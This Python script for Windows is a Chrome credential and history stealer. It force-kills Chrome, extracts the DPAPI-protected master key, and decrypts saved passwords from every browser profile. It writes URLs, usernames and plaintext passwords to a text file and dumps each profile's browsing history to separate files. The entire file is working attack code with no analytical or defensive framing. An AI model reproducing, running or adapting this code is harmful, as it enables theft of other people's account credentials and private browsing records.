
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import datetime
import subprocess


# ----------------- UTILITIES ------------------

def kill_chrome():
    try:
        subprocess.run("taskkill /F /IM chrome.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[✓] Chrome processes terminated.")
    except Exception as e:
        print(f"[!] Could not kill Chrome: {e}")


def chrome_time_to_datetime(chrome_time):
    epoch_start = datetime.datetime(1601, 1, 1)
    delta = datetime.timedelta(microseconds=chrome_time)
    return epoch_start + delta if chrome_time else "N/A"


# ----------------- DECRYPTION ------------------

def get_master_key():
    try:
        local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # remove "DPAPI" prefix
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"[!] Failed to get master key: {e}")
        return None



def decrypt_password(encrypted_value, master_key):
    try:
        if encrypted_value[:3] == b'v10':  # AES-GCM encrypted
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]

            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            return decrypted_pass.decode('utf-8', errors='ignore')

        else:  # Legacy DPAPI
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')

    except Exception as e:
        return f"[!] Decryption failed (AES or DPAPI): {e}"



# ----------------- PROFILE PATHS ------------------

def get_all_profile_paths(file_name):
    base_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile ")]
    paths = []
    for profile in profiles:
        full_path = os.path.join(base_path, profile, file_name)
        if os.path.exists(full_path):
            paths.append((profile, full_path))
    return paths


# ----------------- LOGIN EXTRACTION ------------------

def fetch_logins():
    print("\n Fetching Chrome Saved Logins...\n")
    master_key = get_master_key()
    if not master_key:
        print("[!] Cannot continue without master key.")
        return

    output_file = open("decrypted_credentials.txt", "w", encoding="utf-8")
    login_paths = get_all_profile_paths("Login Data")

    for profile, db_path in login_paths:
        print(f"\n🔍 Profile: {profile}")
        try:
            temp_db = f"temp_login_{profile}.db"
            shutil.copy2(db_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            print(f"[✓] Found {len(rows)} entries.")

            for url, username, enc_pass in rows:
                dec_pass = decrypt_password(enc_pass, master_key)
                if username.strip() and dec_pass:
                    output = f"[{profile}]\nURL: {url}\nUsername: {username}\nPassword: {dec_pass}\n\n"
                    output_file.write(output)

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"[!] Failed to read logins from {profile}: {e}")

    output_file.close()
    print("\n Passwords saved to decrypted_credentials.txt")


# ----------------- HISTORY EXTRACTION ------------------

def fetch_history():
    print("\n Fetching Chrome Browsing History...\n")
    history_paths = get_all_profile_paths("History")

    for profile, db_path in history_paths:
        print(f"\n Profile: {profile}")
        try:
            temp_db = f"temp_history_{profile}.db"
            shutil.copy2(db_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            rows = cursor.fetchall()

            with open(f"history_output_{profile}.txt", "w", encoding="utf-8") as f:
                for url, title, visits, last_time in rows:
                    visit_time = chrome_time_to_datetime(last_time)
                    entry = f"URL: {url}\nTitle: {title}\nVisits: {visits}\nLast Visit: {visit_time}\n\n"
                    f.write(entry)

            print(f"[✓] Saved {len(rows)} entries to history_output_{profile}.txt")
            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"[!] Failed to extract history from {profile}: {e}")


# ----------------- MAIN ------------------

if __name__ == "__main__":
    kill_chrome()
    fetch_logins()
    fetch_history()


























